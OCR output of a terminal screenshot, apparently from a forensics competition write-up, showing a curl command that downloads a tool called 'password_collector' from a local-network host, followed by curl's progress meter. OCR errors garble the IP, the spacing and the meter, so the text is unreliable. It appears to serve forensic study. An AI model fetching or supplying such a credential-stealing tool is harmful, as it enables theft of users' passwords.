@@ -1,0 +1,23 @@
+# OCR: 2505b193ef434a85cf5ea2e08103832f.webp
+# 来源: ./02-WriteUp/2025/2025-FIC-决赛-XDforensics-wiki/2505b193ef434a85cf5ea2e08103832f.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:25
+
+NoahTie@LAPTOP-H91IARRE
+curlhttp://192.168.137.1o0/password_collector--output./password_collector
+%Totat 100
+4818k
+%Received%Xferd
+100
+4818k
+0
+0
+AverageSpeed
+DLoad 6655k
+UpLoad
+0
+Time Total
+Time Spent
+Time Left
+Current Speed 6655k
